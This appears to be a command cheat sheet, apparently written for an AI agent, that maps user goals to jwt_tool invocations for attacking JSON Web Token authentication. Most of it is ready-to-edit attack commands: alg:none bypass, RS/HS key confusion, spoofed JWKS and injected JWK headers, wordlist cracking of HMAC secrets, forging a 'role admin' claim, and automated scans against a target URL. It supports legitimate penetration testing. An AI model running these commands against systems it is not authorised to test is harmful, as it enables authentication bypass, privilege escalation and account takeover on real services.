# jwt_tool command recipes

Use this file when you need a compact lookup from user intent to `jwt_tool` commands.

## Goal To Mode

| Goal | Primary flags | Notes |
| --- | --- | --- |
| Decode and inspect token | none | `python3 jwt_tool.py '<JWT>'` |
| Verify with PEM key | `-V -pk` | Good for RSA or EC public key validation |
| Verify with JWKS file | `-V -jw` | Works after downloading the JWKS locally |
| Crack HMAC secret | `-C -d` or `-C -p` | HMAC algorithms only |
| Playbook scan | `-M pb` | Best broad first pass |
| Forced error scan | `-M er` | Useful when behavior differences leak through parser errors |
| Run all scans | `-M at` | Broader but noisier |
| Test alg none | `-X a` | Checks unsigned token acceptance |
| Test key confusion | `-X k -pk` | Needs known public key |
| Spoof remote JWKS | `-X s -ju` | Needs controllable JWKS hosting |
| Inject inline JWK | `-X i` | Tests attacker-controlled `jwk` trust |
| Inject payload or header claims | `-I` with `-pc/-pv` or `-hc/-hv` | Prefer over `-T` for repeatable commands |
| Manual interactive tamper | `-T` | Use when the user wants to explore by hand |
| Query prior request log | `-Q` | Uses a `jwttool_<id>` value |

## Request Transport

Prefer request file mode when possible:

```bash
python3 jwt_tool.py -r request.txt -M pb
```

Fallback to manual request construction when needed:

```bash
python3 jwt_tool.py -t 'https://target.example/profile' -rh 'Authorization: Bearer <JWT>' -cv 'Welcome' -M pb
python3 jwt_tool.py -t 'https://target.example/' -rc 'jwt=<JWT>; session=abc' -M er
```

## Common Ready-To-Edit Examples

### Decode

```bash
python3 jwt_tool.py '<JWT>'
```

### Verify with PEM

```bash
python3 jwt_tool.py '<JWT>' -V -pk public.pem
```

### Verify with JWKS

```bash
python3 jwt_tool.py '<JWT>' -V -jw jwks.json
```

### Crack HMAC key

```bash
python3 jwt_tool.py '<JWT>' -C -d jwt-common.txt
```

### Try `alg:none`

```bash
python3 jwt_tool.py '<JWT>' -X a
```

### Try key confusion

```bash
python3 jwt_tool.py '<JWT>' -X k -pk public.pem
```

### Inject role claim and sign with known HMAC secret

```bash
python3 jwt_tool.py '<JWT>' -I -pc role -pv admin -S hs256 -p 'secret'
```

### Playbook scan with cookie token

```bash
python3 jwt_tool.py -t 'https://target.example/' -rc 'jwt=<JWT>' -cv 'Welcome' -M pb
```

### Playbook scan with Authorization header

```bash
python3 jwt_tool.py -t 'https://target.example/me' -rh 'Authorization: Bearer <JWT>' -M pb
```

### Query logs

```bash
python3 jwt_tool.py -Q jwttool_deadbeef1234567890
```

## Heuristics

- If the user has a full request, use `-r`.
- If the user has a public key, test `-V` before `-X k`.
- If the token is `HS*`, secret cracking is in scope.
- If the token is `RS*`, `ES*`, or `PS*`, look at `kid`, `jku`, `jwk`, and public-key trust behavior.
- If the app gives a stable success string, add `-cv`.
- If the user wants a repeatable mutation, choose `-I` over `-T`.
